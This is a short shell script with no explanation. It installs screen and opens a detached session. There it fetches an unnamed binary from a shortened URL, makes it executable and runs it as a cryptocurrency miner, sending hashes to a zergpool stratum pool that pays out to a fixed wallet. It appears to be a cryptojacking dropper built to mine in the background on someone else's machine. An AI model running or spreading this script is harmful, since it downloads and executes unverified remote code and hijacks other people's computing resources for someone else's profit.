#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layer" -d -m
screen -r "layer" -X stuff $'apt-get update && apt-get install libcurl4 libjansson4 && wget -O build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE -p c=DOGE,mc=VRSC -t 8\n'
